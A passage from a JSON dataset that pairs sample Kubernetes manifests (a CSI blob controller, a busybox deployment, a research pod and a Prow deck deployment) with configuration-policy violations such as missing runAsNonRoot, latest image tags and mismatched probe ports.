    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-blob-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-blob-controller\n  template:\n    metadata:\n      labels:\n        app: csi-blob-controller\n    spec:\n      serviceAccountName: csi-blob-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v3.1.0\n        args:\n        - -v=2\n        - --csi-address=$(ADDRESS)\n        - --leader-election\n        - --leader-election-namespace=kube-system\n        - --timeout=120s\n        - --extra-create-metadata=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.6.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=29632\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: blob\n        image: mcr.microsoft.com/k8s/csi/blob-csi:latest\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29634\n        - --user-agent-suffix=OSS-kubectl\n        ports:\n        - containerPort: 29632\n          name: healthz\n          protocol: TCP\n        - containerPort: 29634\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        resources:\n          limits:\n            memory: 200Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-resizer\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.4.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -handle-volume-inuse-error=false\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: DirectoryOrCreate\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"blob\" is not set to runAsNonRoot"
  },
  {
    "id": "6818",
    "manifest_path": "data/manifests/the_stack_sample/sample_2482.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-blob-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-blob-controller\n  template:\n    metadata:\n      labels:\n        app: csi-blob-controller\n    spec:\n      serviceAccountName: csi-blob-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v3.1.0\n        args:\n        - -v=2\n        - --csi-address=$(ADDRESS)\n        - --leader-election\n        - --leader-election-namespace=kube-system\n        - --timeout=120s\n        - --extra-create-metadata=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.6.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=29632\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: blob\n        image: mcr.microsoft.com/k8s/csi/blob-csi:latest\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29634\n        - --user-agent-suffix=OSS-kubectl\n        ports:\n        - containerPort: 29632\n          name: healthz\n          protocol: TCP\n        - containerPort: 29634\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        resources:\n          limits:\n            memory: 200Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-resizer\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.4.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -handle-volume-inuse-error=false\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: DirectoryOrCreate\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"csi-provisioner\" is not set to runAsNonRoot"
  },
  {
    "id": "6819",
    "manifest_path": "data/manifests/the_stack_sample/sample_2482.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-blob-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-blob-controller\n  template:\n    metadata:\n      labels:\n        app: csi-blob-controller\n    spec:\n      serviceAccountName: csi-blob-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v3.1.0\n        args:\n        - -v=2\n        - --csi-address=$(ADDRESS)\n        - --leader-election\n        - --leader-election-namespace=kube-system\n        - --timeout=120s\n        - --extra-create-metadata=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.6.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=29632\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: blob\n        image: mcr.microsoft.com/k8s/csi/blob-csi:latest\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29634\n        - --user-agent-suffix=OSS-kubectl\n        ports:\n        - containerPort: 29632\n          name: healthz\n          protocol: TCP\n        - containerPort: 29634\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        resources:\n          limits:\n            memory: 200Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-resizer\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.4.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -handle-volume-inuse-error=false\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: DirectoryOrCreate\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"csi-resizer\" is not set to runAsNonRoot"
  },
  {
    "id": "6820",
    "manifest_path": "data/manifests/the_stack_sample/sample_2482.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-blob-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-blob-controller\n  template:\n    metadata:\n      labels:\n        app: csi-blob-controller\n    spec:\n      serviceAccountName: csi-blob-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v3.1.0\n        args:\n        - -v=2\n        - --csi-address=$(ADDRESS)\n        - --leader-election\n        - --leader-election-namespace=kube-system\n        - --timeout=120s\n        - --extra-create-metadata=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.6.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=29632\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: blob\n        image: mcr.microsoft.com/k8s/csi/blob-csi:latest\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29634\n        - --user-agent-suffix=OSS-kubectl\n        ports:\n        - containerPort: 29632\n          name: healthz\n          protocol: TCP\n        - containerPort: 29634\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        resources:\n          limits:\n            memory: 200Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-resizer\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.4.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -handle-volume-inuse-error=false\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: DirectoryOrCreate\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"liveness-probe\" is not set to runAsNonRoot"
  },
  {
    "id": "6821",
    "manifest_path": "data/manifests/the_stack_sample/sample_2487.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: deployment-1\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      name: busybox-pod\n  template:\n    metadata:\n      labels:\n        name: busybox-pod\n    spec:\n      containers:\n      - name: busybox-container\n        image: busybox\n        command:\n        - sh\n        - -c\n        - echo Hello Kubernetes! && sleep 3600\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"busybox-container\" is using an invalid container image, \"busybox\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "6822",
    "manifest_path": "data/manifests/the_stack_sample/sample_2487.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: deployment-1\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      name: busybox-pod\n  template:\n    metadata:\n      labels:\n        name: busybox-pod\n    spec:\n      containers:\n      - name: busybox-container\n        image: busybox\n        command:\n        - sh\n        - -c\n        - echo Hello Kubernetes! && sleep 3600\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "6823",
    "manifest_path": "data/manifests/the_stack_sample/sample_2487.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: deployment-1\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      name: busybox-pod\n  template:\n    metadata:\n      labels:\n        name: busybox-pod\n    spec:\n      containers:\n      - name: busybox-container\n        image: busybox\n        command:\n        - sh\n        - -c\n        - echo Hello Kubernetes! && sleep 3600\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"busybox-container\" does not have a read-only root file system"
  },
  {
    "id": "6824",
    "manifest_path": "data/manifests/the_stack_sample/sample_2487.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: deployment-1\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      name: busybox-pod\n  template:\n    metadata:\n      labels:\n        name: busybox-pod\n    spec:\n      containers:\n      - name: busybox-container\n        image: busybox\n        command:\n        - sh\n        - -c\n        - echo Hello Kubernetes! && sleep 3600\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"busybox-container\" is not set to runAsNonRoot"
  },
  {
    "id": "6825",
    "manifest_path": "data/manifests/the_stack_sample/sample_2487.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: deployment-1\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      name: busybox-pod\n  template:\n    metadata:\n      labels:\n        name: busybox-pod\n    spec:\n      containers:\n      - name: busybox-container\n        image: busybox\n        command:\n        - sh\n        - -c\n        - echo Hello Kubernetes! && sleep 3600\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"busybox-container\" has cpu request 0"
  },
  {
    "id": "6826",
    "manifest_path": "data/manifests/the_stack_sample/sample_2487.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: deployment-1\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      name: busybox-pod\n  template:\n    metadata:\n      labels:\n        name: busybox-pod\n    spec:\n      containers:\n      - name: busybox-container\n        image: busybox\n        command:\n        - sh\n        - -c\n        - echo Hello Kubernetes! && sleep 3600\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"busybox-container\" has memory limit 0"
  },
  {
    "id": "6827",
    "manifest_path": "data/manifests/the_stack_sample/sample_2489.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: cyborg-seeker-finals-nrfin00046-pov0\n  labels:\n    type: cyborg-seeker\nspec:\n  volumes:\n  - name: cyborg-results\n    persistentVolumeClaim:\n      claimName: cyborg-results\n  containers:\n  - name: cyborg-seeker-finals-nrfin00046-pov0\n    image: zardus/research:cyborg-generator\n    command:\n    - /bin/bash\n    - -c\n    - python /home/angr/cyborg-generator/kubernetes_seeker.py finals NRFIN_00046 pov_0\n      3600\n    imagePullPolicy: Always\n    volumeMounts:\n    - name: cyborg-results\n      mountPath: /results\n    resources:\n      limits:\n        cpu: 1\n        memory: 10Gi\n      requests:\n        cpu: 1\n        memory: 10Gi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cyborg-seeker-finals-nrfin00046-pov0\" does not have a read-only root file system"
  },
  {
    "id": "6828",
    "manifest_path": "data/manifests/the_stack_sample/sample_2489.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: cyborg-seeker-finals-nrfin00046-pov0\n  labels:\n    type: cyborg-seeker\nspec:\n  volumes:\n  - name: cyborg-results\n    persistentVolumeClaim:\n      claimName: cyborg-results\n  containers:\n  - name: cyborg-seeker-finals-nrfin00046-pov0\n    image: zardus/research:cyborg-generator\n    command:\n    - /bin/bash\n    - -c\n    - python /home/angr/cyborg-generator/kubernetes_seeker.py finals NRFIN_00046 pov_0\n      3600\n    imagePullPolicy: Always\n    volumeMounts:\n    - name: cyborg-results\n      mountPath: /results\n    resources:\n      limits:\n        cpu: 1\n        memory: 10Gi\n      requests:\n        cpu: 1\n        memory: 10Gi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cyborg-seeker-finals-nrfin00046-pov0\" is not set to runAsNonRoot"
  },
  {
    "id": "6829",
    "manifest_path": "data/manifests/the_stack_sample/sample_2491.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: deck\n  labels:\n    app: deck\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: deck\n  template:\n    metadata:\n      labels:\n        app: deck\n    spec:\n      serviceAccountName: deck\n      containers:\n      - name: deck\n        image: gcr.io/k8s-prow/deck:v20201030-914f29394d\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 8080\n        args:\n        - --kubeconfig=/etc/kubeconfig/config\n        - --tide-url=http://tide/\n        - --hook-url=http://hook:8888/plugin-help\n        - --redirect-http-to=prow.k8s.io\n        - --oauth-url=/github-login\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --spyglass=true\n        - --rerun-creates-job\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-oauth-config-file=/etc/githuboauth/secret\n        - --cookie-secret=/etc/cookie/secret\n        - --plugin-config=/etc/plugins/plugins.yaml\n        volumeMounts:\n        - name: oauth-config\n          mountPath: /etc/githuboauth\n          readOnly: true\n        - name: cookie-secret\n          mountPath: /etc/cookie\n          readOnly: true\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: oauth-config\n        secret:\n          secretName: github-oauth-config\n      - name: oauth-token\n        secret:\n          secretName: oauth-token\n      - name: cookie-secret\n        secret:\n          secretName: cookie\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "liveness-port",
    "violation_text": "container \"deck\" does not expose port 8081 for the HTTPGet"
  },
  {
    "id": "6830",
    "manifest_path": "data/manifests/the_stack_sample/sample_2491.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: deck\n  labels:\n    app: deck\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: deck\n  template:\n    metadata:\n      labels:\n        app: deck\n    spec:\n      serviceAccountName: deck\n      containers:\n      - name: deck\n        image: gcr.io/k8s-prow/deck:v20201030-914f29394d\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 8080\n        args:\n        - --kubeconfig=/etc/kubeconfig/config\n        - --tide-url=http://tide/\n        - --hook-url=http://hook:8888/plugin-help\n        - --redirect-http-to=prow.k8s.io\n        - --oauth-url=/github-login\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --spyglass=true\n        - --rerun-creates-job\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-oauth-config-file=/etc/githuboauth/secret\n        - --cookie-secret=/etc/cookie/secret\n        - --plugin-config=/etc/plugins/plugins.yaml\n        volumeMounts:\n        - name: oauth-config\n          mountPath: /etc/githuboauth\n          readOnly: true\n        - name: cookie-secret\n          mountPath: /etc/cookie\n          readOnly: true\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: oauth-config\n        secret:\n          secretName: github-oauth-config\n      - name: oauth-token\n        secret:\n          secretName: oauth-token\n      - name: cookie-secret\n        secret:\n          secretName: cookie\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "6831",
    "manifest_path": "data/manifests/the_stack_sample/sample_2491.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: deck\n  labels:\n    app: deck\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: deck\n  template:\n    metadata:\n      labels:\n        app: deck\n    spec:\n      serviceAccountName: deck\n      containers:\n      - name: deck\n        image: gcr.io/k8s-prow/deck:v20201030-914f29394d\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 8080\n        args:\n        - --kubeconfig=/etc/kubeconfig/config\n        - --tide-url=http://tide/\n        - --hook-url=http://hook:8888/plugin-help\n        - --redirect-http-to=prow.k8s.io\n        - --oauth-url=/github-login\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --spyglass=true\n        - --rerun-creates-job\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-oauth-config-file=/etc/githuboauth/secret\n        - --cookie-secret=/etc/cookie/secret\n        - --plugin-config=/etc/plugins/plugins.yaml\n        volumeMounts:\n        - name: oauth-config\n          mountPath: /etc/githuboauth\n          readOnly: true\n        - name: cookie-secret\n          mountPath: /etc/cookie\n          readOnly: true\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: oauth-config\n        secret:\n          secretName: github-oauth-config\n      - name: oauth-token\n        secret:\n          secretName: oauth-token\n      - name: cookie-secret\n        secret:\n          secretName: cookie\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"deck\" does not have a read-only root file system"
  },
  {
    "id": "6832",
    "manifest_path": "data/manifests/the_stack_sample/sample_2491.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: deck\n  labels:\n    app: deck\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: deck\n  template:\n    metadata:\n      labels:\n        app: deck\n    spec:\n      serviceAccountName: deck\n      containers:\n      - name: deck\n        image: gcr.io/k8s-prow/deck:v20201030-914f29394d\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 8080\n        args:\n        - --kubeconfig=/etc/kubeconfig/config\n        - --tide-url=http://tide/\n        - --hook-url=http://hook:8888/plugin-help\n        - --redirect-http-to=prow.k8s.io\n        - --oauth-url=/github-login\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --spyglass=true\n        - --rerun-creates-job\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-oauth-config-file=/etc/githuboauth/secret\n        - --cookie-secret=/etc/cookie/secret\n        - --plugin-config=/etc/plugins/plugins.yaml\n        volumeMounts:\n        - name: oauth-config\n          mountPath: /etc/githuboauth\n          readOnly: true\n        - name: cookie-secret\n          mountPath: /etc/cookie\n          readOnly: true\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: oauth-config\n        secret:\n          secretName: github-oauth-config\n      - name: oauth-token\n        secret:\n          secretName: oauth-token\n      - name: cookie-secret\n        secret:\n          secretName: cookie\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"deck\" not found"
  },
  {
    "id": "6833",
    "manifest_path": "data/manifests/the_stack_sample/sample_2491.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: deck\n  labels:\n    app: deck\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: deck\n  template:\n    metadata:\n      labels:\n        app: deck\n    spec:\n      serviceAccountName: deck\n      containers:\n      - name: deck\n        image: gcr.io/k8s-prow/deck:v20201030-914f29394d\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 8080\n        args:\n        - --kubeconfig=/etc/kubeconfig/config\n        - --tide-url=http://tide/\n        - --hook-url=http://hook:8888/plugin-help\n        - --redirect-http-to=prow.k8s.io\n        - --oauth-url=/github-login\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --spyglass=true\n        - --rerun-creates-job\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-oauth-config-file=/etc/githuboauth/secret\n        - --cookie-secret=/etc/cookie/secret\n        - --plugin-config=/etc/plugins/plugins.yaml\n        volumeMounts:\n        - name: oauth-config\n          mountPath: /etc/githuboauth\n          readOnly: true\n        - name: cookie-secret\n          mountPath: /etc/cookie\n          readOnly: true\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: oauth-config\n        secret:\n          secretName: github-oauth-config\n      - name: oauth-token\n        secret:\n          secretName: oauth-token\n      - name: cookie-secret\n        secret:\n          secretName: cookie\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "readiness-port",
    "violation_text": "container \"deck\" does not expose port 8081 for the HTTPGet"
  },
  {
